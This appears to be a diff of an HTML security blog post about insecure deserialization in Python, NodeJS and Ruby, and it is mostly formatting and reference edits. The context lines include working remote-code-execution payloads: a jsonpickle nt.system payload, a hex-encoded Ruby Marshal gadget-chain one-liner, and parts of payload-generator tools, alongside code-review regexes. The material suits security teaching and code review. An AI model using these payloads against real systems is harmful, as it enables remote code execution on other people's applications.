-<span class="n">yaml</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">Payload</span><span class="p">())</span>
+<span class="n">jsonpickle</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">Payload</span><span class="p">())</span>
 </pre></div>
 
 <p>Ok, that&rsquo;s seems interesting, but still we would like to generate our serialized payloads without rewriting the code anytime we need to issue a different command, right? So, last but not least, we&rsquo;ll explore a way to dynamically generate valid payloads for all the python modules we saw above.</p>
-<p><strong>Generating Exploits for pickle, PyYAML, and jsonpickle</strong></p>
+<h4 id="generate-payloads-dynamically-deser-py">Generate payloads dynamically: deser-py<a class="headerlink" href="#generate-payloads-dynamically-deser-py" title="Permanent link"></a></h4>
 <p>I created the following tool, called <strong>deser-py</strong>, which can be used to generate different payloads for pickle, yaml and jsonpickle. The tool can be also downloaded <a href="https://github.com/klezVirus/deser-py">here</a>.</p>
 <div class="codehilite"><pre><span class="kn">import</span> <span class="nn">os</span>
 <span class="kn">import</span> <span class="nn">_pickle</span>
@@ -2923,18 +2980,14 @@ optional arguments:
     <span class="o">{</span><span class="s2">&quot;py/reduce&quot;</span>: <span class="o">[{</span><span class="s2">&quot;py/function&quot;</span>: <span class="s2">&quot;nt.system&quot;</span><span class="o">}</span>, <span class="o">{</span><span class="s2">&quot;py/tuple&quot;</span>: <span class="o">[</span><span class="s2">&quot;cmd /c calc&quot;</span><span class="o">]}]}</span>
 </pre></div>
 
-<p><strong>Tips for Source Code reviewers</strong></p>
+<h4 id="tips-for-source-code-reviewers_2">Tips for Source Code reviewers<a class="headerlink" href="#tips-for-source-code-reviewers_2" title="Permanent link"></a></h4>
 <p>To find this kind of vulnerability it is usually a good start to search the code for common regexes, like: </p>
 <ul>
 <li><code>(loads|load|unsafe_load|decode)\s*\(</code></li>
 <li><code>([p|P]ickle|yaml)</code></li>
 </ul>
 <p>For each match, the code should be manually inspected to see whether the object being deserialized can be manipulated by an external attacker.</p>
-<h4 id="references_3">References<a class="headerlink" href="#references_3" title="Permanent link"></a></h4>
-<ul>
-<li><a href="https://www.exploit-db.com/docs/47655">PyYAML - Exploit-DB</a></li>
-<li><a href="https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/">Exploiting jsonpickle</a></li>
-</ul>
+<hr />
 <h3 id="nodejs">NodeJS<a class="headerlink" href="#nodejs" title="Permanent link"></a></h3>
 <p>In NodeJS, serialization is handled by many different modules, which allow to marshal arbitrary complex objects in JSON-like format. We&rsquo;ll se a few of them, which were found to be susceptible to deserialization issues:</p>
 <ul>
@@ -2943,6 +2996,7 @@ optional arguments:
 <li>funcster</li>
 </ul>
 <p>Before starting digging into the vulnerabilities, it should be clear to the reader that this kind of issues in JavaScript behave way differently in comparison to previous examples. No POP gadget chain is required to trigger RCE or sort of. Why so? Well, usually, bug of this type in JavaScript implies the serialized payload to be passed to functions like <code>eval()</code>, or <code>new Function()</code>, which implies that arbitrary code may be executed by the application.</p>
+<h4 id="nodejs-text-based-archive-format">NodeJS: Text-based archive format<a class="headerlink" href="#nodejs-text-based-archive-format" title="Permanent link"></a></h4>
 <p><strong>node-serialize</strong></p>
 <p>The first NodeJS module we&rsquo;ll analyse is <code>node-serialize</code>. In 2017, a researcher named <strong>Ajin Abraham</strong> found that this module allowed deserialization of function objects in a non-safe way, leading to RCE. </p>
 <p>If you test it, you&rsquo;ll find out that <code>node-serialize</code> serializes objects using regular JSON format. The question that may arise is, why not JSON.stringify(), then? The reason being that JSON cannot really serialize functions.</p>
@@ -3015,7 +3069,7 @@ optional arguments:
 
 <p>During deserialization, cryo would redefine the <code>toString()</code> function, via <code>__proto__</code> accessor. If later on the application try calling the <code>toString()</code> method of the deserialized object, the RCE function would be called instead.
 Of course, we can redefine whatever object method we like, <code>toString</code> is just an example.</p>
-<h4 id="generate-payloads-dynamically">Generate payloads dynamically<a class="headerlink" href="#generate-payloads-dynamically" title="Permanent link"></a></h4>
+<h4 id="generate-payloads-dynamically-deser-node">Generate payloads dynamically: deser-node<a class="headerlink" href="#generate-payloads-dynamically-deser-node" title="Permanent link"></a></h4>
 <p>As we&rsquo;ve seen how the process works, it&rsquo;s time to create our payloads. I order to do that, the following script, named <strong>desert-node</strong>, can be used to generate different payloads for the libraries we&rsquo;ve just seen. The tool can be also downloaded <a href="https://github.com/klezVirus/deser-node">here</a>.</p>
 <div class="codehilite"><pre><span class="cm">/**</span>
 <span class="cm">* This script provides a simple cli to generate payloads for:</span>
@@ -3278,14 +3332,14 @@ Of course, we can redefine whatever object method we like, <code>toString</code>
 <span class="p">}</span>
 </pre></div>
 
-<p><strong>Tips for Source Code reviewers</strong></p>
+<h4 id="tips-for-source-code-reviewers_3">Tips for Source Code reviewers<a class="headerlink" href="#tips-for-source-code-reviewers_3" title="Permanent link"></a></h4>
 <p>For NodeJS application, it&rsquo;s very difficult to advice on common strategies to get this kind of issues, as many libraries exist and many may be created in the future. Even though, as a general recommendation, it is usually a good idea to start searching the code for common regexes, like: </p>
 <ul>
 <li><code>(unserialize|parse)\s*\(</code></li>
 <li><code>(node-serialize|funcster|serialize-to-js|cryo)</code></li>
 </ul>
 <p>For each match, the code should be manually inspected to see whether the object being deserialized can be manipulated by an external attacker.</p>
-<h4 id="references_4">References<a class="headerlink" href="#references_4" title="Permanent link"></a></h4>
+<h3 id="references_2">References<a class="headerlink" href="#references_2" title="Permanent link"></a></h3>
 <ul>
 <li><a href="https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/">https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/</a></li>
 </ul>
@@ -3295,8 +3349,9 @@ Of course, we can redefine whatever object method we like, <code>toString</code>
 <li>Marshal.load()</li>
 <li>YAML.load()</li>
 </ul>
+<h4 id="ruby-binary-archive-format">Ruby: Binary Archive Format<a class="headerlink" href="#ruby-binary-archive-format" title="Permanent link"></a></h4>
 <p><strong>Marshal</strong></p>
-<p>Originally, this vulnerability was found by <strong>Charlie Somerville</strong> during a research against Ruby on Rails, which leaded to the discovery of a gadget chain based on the <code>rails</code> module. However, the chain as it was, presented some major fallbacks:</p>
+<p>Originally, this vulnerability was found by <strong>Charlie Somerville</strong> during a research against Ruby on Rails, which leaded to the discovery of a gadget chain based on the <code>rails</code> module. However, the chain as it was, presented some major drawbacks:</p>
 <ul>
 <li>ActiveSupport gem must be loaded</li>
 <li>ERB from stdlib must be loaded</li>
@@ -3330,12 +3385,7 @@ TEST
 </ol>
 <p>The script provided by the researcher, generates the hex version and the base64 version of the payload, for the static command &ldquo;id&rdquo;. The payload may be found even on <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md">PayloadAllTheThings</a>.</p>
 <p>To test it, it is enough to launch the following command:</p>
-<div class="codehilite"><pre><span class="nv">$ </span>ruby -e <span class="s1">&#39;Marshal.load([&quot;\
-0408553a1547656d3a3a526571756972656d656e745b066f3a1847656d3a3a446570656e64656e63794c697374073\
-a0b4073706563735b076f3a1e47656d3a3a536f757263653a3a537065636966696346696c65063a0a40737065636f3\
-a1b47656d3a3a5374756253706563696669636174696f6e083a11406c6f616465645f66726f6d4922167c636d64202\
-f632063616c6320313e2632063a0645543a0a4064617461303b09306f3b08003a1140646576656c6f706d656e7446\
-&quot;].pack(&quot;H*&quot;)) rescue nil&#39;</span>
+<div class="codehilite"><pre><span class="nv">$ </span>ruby -e <span class="s1">&#39;Marshal.load([&quot;0408553a1547656d3a3a526571756972656d656e745b066f3a1847656d3a3a446570656e64656e63794c697374073a0b4073706563735b076f3a1e47656d3a3a536f757263653a3a537065636966696346696c65063a0a40737065636f3a1b47656d3a3a5374756253706563696669636174696f6e083a11406c6f616465645f66726f6d4922167c636d64202f632063616c6320313e2632063a0645543a0a4064617461303b09306f3b08003a1140646576656c6f706d656e7446&quot;].pack(&quot;H*&quot;)) rescue nil&#39;</span>
 </pre></div>
 
 <p>However, the script provided shows a list of drawbacks:</p>
@@ -3344,6 +3394,7 @@ f632063616c6320313e2632063a0645543a0a4064617461303b09306f3b08003a1140646576656c6
 <li>Does not offer dynamic generation (with custom commands)</li>
 <li>Can be used only for Marshal payloads</li>
 </ul>
+<h4 id="ruby-text-based-archive-format">Ruby: Text-Based archive format<a class="headerlink" href="#ruby-text-based-archive-format" title="Permanent link"></a></h4>
 <p><strong>YAML</strong></p>
 <p>It may sound trivial, but the same chain can be applied to the <code>YAML.load()</code> function as well. If you accessed <strong>PayloadAllTheThings</strong> previously, you probably noticed the following YAML payload:</p>
 <div class="codehilite"><pre><span class="nn">---</span> <span class="kt">!ruby</span><span class="l l-Scalar l-Scalar-Plain">/object:Gem::Requirement</span>
@@ -3361,7 +3412,8 @@ f632063616c6320313e2632063a0645543a0a4064617461303b09306f3b08003a1140646576656c6
 <p>The payload has been created by another security researcher name <strong>Etienne Stalmans (aka STRAALDRAAD)</strong>, his full research can be found <a href="https://staaldraad.github.io/post/2019-03-02-universal-rce-ruby-yaml-load/">here</a>.
 However, a as you can read from his research, the payload was created &ldquo;manually&rdquo;. If you wonder why, the research explained that using the original script for the Marshal payload, of course changing the call to <code>Marshal.dump</code> with <code>YAML.dump</code>, produced a not working (incomplete) payload. I was personally disappointed by this approach, as the script could easily be fixed.
 The main problem was the use of global variables (<code>$-</code>prefixed variables) with <code>YAML.dump</code>, which force the payload to be executed during serialization (which is necessary to generate the correct payload with <code>Marshal.dump</code>), but would prevent the yaml payload from being generated (as an exception would show before the end of the function). Transforming the global variable in a local one, and rebuilding the object for serialization, successfully solved the issue.</p>
-<p>For the sake of completeness and to provide an example of what I said above, I wrote the following tool, named <strong>desert-ruby</strong>, that could be used to dynamically generate valid payloads for both Marshal and YAML of Ruby, using the <strong>Universal Ruby 2.x RCE Gadget Chain</strong>. The tool can also be downloaded <a href="https://github.com/klezVirus/deser-ruby">here</a>. </p>
+<h4 id="generate-payloads-dynamically-deser-ruby">Generate payloads dynamically: deser-ruby<a class="headerlink" href="#generate-payloads-dynamically-deser-ruby" title="Permanent link"></a></h4>
+<p>For the sake of completeness and to provide an example of what I said above, I wrote the following tool, named <strong>desert-ruby</strong>, that could be used to dynamically generate valid payloads for both Marshal and YAML of Ruby, using the <strong>Universal Ruby 2.x RCE Gadget Chain</strong>. An up-to-date version of the tool can also be downloaded <a href="https://github.com/klezVirus/deser-ruby">here</a>.</p>
 <div class="codehilite"><pre><span class="ch">#!/usr/bin/env ruby</span>
 <span class="nb">require</span> <span class="s1">&#39;optparse&#39;</span>
 <span class="nb">require</span> <span class="s1">&#39;yaml&#39;</span>
@@ -3525,13 +3577,24 @@ The main problem was the use of global variables (<code>$-</code>prefixed variab
 </pre></div>
 
 <p>A calculator will spawn on the hosting system.</p>
-<p><strong>Tips for Source Code reviewers</strong></p>
+<h4 id="tips-for-source-code-reviewers_4">Tips for Source Code reviewers<a class="headerlink" href="#tips-for-source-code-reviewers_4" title="Permanent link"></a></h4>
 <p>To find this kind of vulnerability it is usually a good start to search the code for common regexes, like: </p>
 <ul>
 <li><code>(Marshal.load|YAML.load)\s*\(</code></li>
 </ul>
 <p>For each match, the code should be manually inspected to see whether the object being deserialized can be manipulated by an external attacker.</p>
-<h4 id="references_5">References<a class="headerlink" href="#references_5" title="Permanent link"></a></h4>
+<h4 id="references_3">References<a class="headerlink" href="#references_3" title="Permanent link"></a></h4>
+<p><strong>PHP</strong></p>
+<ul>
+<li><a href="https://www.php.net/manual/en/language.oop5.magic.php">Magic-Methods</a></li>
+<li><a href="https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection">PHP Object Injection</a></li>
+</ul>
+<p><strong>Python</strong></p>
+<ul>
+<li><a href="https://www.exploit-db.com/docs/47655">PyYAML - Exploit-DB</a></li>
+<li><a href="https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/">Exploiting jsonpickle</a></li>
+</ul>
+<p><strong>Ruby</strong></p>
 <ul>
 <li><a href="https://www.elttam.com/blog/ruby-deserialization/">Universal RCE for Ruby 2.x</a></li>
 <li><a href="https://staaldraad.github.io/post/2019-03-02-universal-rce-ruby-yaml-load/">Universal RCE for Ruby2.x - YAML</a></li>
